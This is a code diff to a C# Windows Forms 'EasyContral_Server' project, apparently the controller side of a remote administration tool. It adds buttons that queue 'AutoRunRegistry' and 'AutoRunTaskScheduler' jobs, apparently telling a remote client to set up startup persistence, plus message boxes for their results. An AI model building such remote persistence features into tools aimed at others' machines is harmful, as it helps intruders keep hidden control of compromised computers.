@@ -11,6 +11,7 @@ using System.Windows.Forms;
 using Microsoft.VisualBasic;
 using Newtonsoft.Json;
 using static System.Windows.Forms.AxHost;
+using static System.Windows.Forms.VisualStyles.VisualStyleElement.TaskbarClock;
 
 namespace EasyContral_Server
 {
@@ -148,6 +149,12 @@ namespace EasyContral_Server
                             case "GetProcessResult":
                                 Dictionary<string, Dictionary<string, string>> DicProcess = JsonConvert.DeserializeObject<Dictionary<string, Dictionary<string, string>>>(output);
                                 processcontral.UpdateListView(DicProcess);
+                                break;
+                            case "AutoRunTaskSchedulerResult":
+                                MessageBox.Show("已执行");
+                                break;
+                            case "AutoRunRegistryResult":
+                                MessageBox.Show("已执行");
                                 break;
                             default:
                                 MessageBox.Show("错误");
@@ -328,6 +335,30 @@ namespace EasyContral_Server
                         }
                     }
                 }
+            }
+        }
+
+        private void Registry_Click(object sender, EventArgs e)
+        {
+            DialogResult result = MessageBox.Show("确认执行该操作吗？", "确认", MessageBoxButtons.YesNo, MessageBoxIcon.Question);
+            if (result == DialogResult.Yes)
+            {
+                Dictionary<string, string> Jobe = new Dictionary<string, string>();
+                Jobe.Add("Type", "AutoRunRegistry");
+                Jobe.Add("Data", "AutoRunRegistry");
+                Form1.Jobes.Enqueue(Jobe);
+            }
+        }
+
+        private void TaskScheduler_Click(object sender, EventArgs e)
+        {
+            DialogResult result = MessageBox.Show("确认执行该操作吗？", "确认", MessageBoxButtons.YesNo, MessageBoxIcon.Question);
+            if (result == DialogResult.Yes)
+            {
+                Dictionary<string, string> Jobe = new Dictionary<string, string>();
+                Jobe.Add("Type", "AutoRunTaskScheduler");
+                Jobe.Add("Data", "AutoRunTaskScheduler");
+                Form1.Jobes.Enqueue(Jobe);
             }
         }
     }
